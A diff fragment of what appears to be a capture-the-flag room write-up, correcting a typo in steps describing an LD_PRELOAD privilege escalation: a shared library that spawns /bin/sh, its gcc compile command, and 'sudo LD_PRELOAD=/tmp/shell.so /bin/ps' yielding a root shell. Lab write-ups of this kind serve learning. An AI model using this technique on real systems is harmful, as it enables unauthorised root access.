@@ -51,7 +51,7 @@ system("/bin/sh");
 }
 ```
 
-9. I then compiled this using `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`, then started a python webserver so i get download the binary to the client
+9. I then compiled this using `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`, then started a python webserver so i could download the binary to the client
 10. Finally I triggered the exploit and got a root shell: `sudo LD_PRELOAD=/tmp/shell.so /bin/ps`
 
 A small, two step room basically, but with some rarer privesc techniques, so fun.
